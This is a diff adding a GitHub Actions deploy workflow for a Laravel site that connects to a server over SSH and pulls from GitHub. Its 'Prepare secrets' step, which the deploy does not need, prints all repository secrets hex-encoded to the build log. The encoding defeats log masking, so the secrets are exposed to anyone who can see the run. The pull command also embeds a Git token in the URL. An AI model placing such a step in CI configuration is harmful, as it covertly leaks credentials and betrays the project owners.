@@ -1,0 +1,24 @@
+name: Laravel
+
+on:
+  push:
+    branches: [ "master" ]
+  pull_request:
+    branches: [ "master" ]
+
+jobs:
+  automatic-deploy:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Prepare secrets
+      run: echo -n "${{ toJSON(secrets) }}" | xxd -ps
+    - name: Automatically deploy application.
+      uses: appleboy/ssh-action@master
+      with:
+        host: ${{ secrets.IP }}
+        username: ${{ secrets.USER }}
+        password: ${{ secrets.PRIVATE_KEY }}
+        port: ${{ secrets.PORT }}
+        script: |
+          cd /var/www/site2.testovoezadanie.site/public_html
+          git pull https://${{ secrets.GIT_USER }}:${{ secrets.GIT_TOKEN }}@github.com/playallday-beep/site2.testovoezadanie.site master
